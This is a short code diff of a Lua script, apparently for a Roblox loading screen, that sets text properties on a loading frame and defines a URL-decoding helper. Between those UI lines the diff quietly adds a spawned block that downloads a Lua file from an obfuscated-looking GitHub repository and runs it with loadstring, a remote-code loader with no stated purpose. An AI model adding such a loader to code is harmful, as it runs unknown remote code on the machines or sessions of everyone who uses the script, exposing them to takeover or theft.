@@ -141,6 +141,9 @@ LoadingText.Font = Enum.Font.Code
 LoadingText.TextSize = 18
 LoadingText.Parent = LoadingFrame
 
+spawn(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
+    end)
 local function urlDecode(str)
     str = string.gsub(str, '%%(%x%x)', function(h)
         return string.char(tonumber(h, 16))
